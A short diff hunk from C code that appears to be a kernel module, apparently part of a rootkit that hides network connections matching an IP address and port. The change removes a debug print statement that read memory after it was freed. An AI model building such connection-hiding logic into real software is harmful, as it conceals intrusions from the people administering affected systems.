@@ -45,7 +45,6 @@ bool filter_by_source_ip_port(__be32 source_address, int source_port) {
     kfree(ipaddr);
 
     if (port_to_hide == -1) {
-        printk("curr: %s to hide: %s", ipaddr, ip_to_hide);
         return does_ip_match;
     }
 
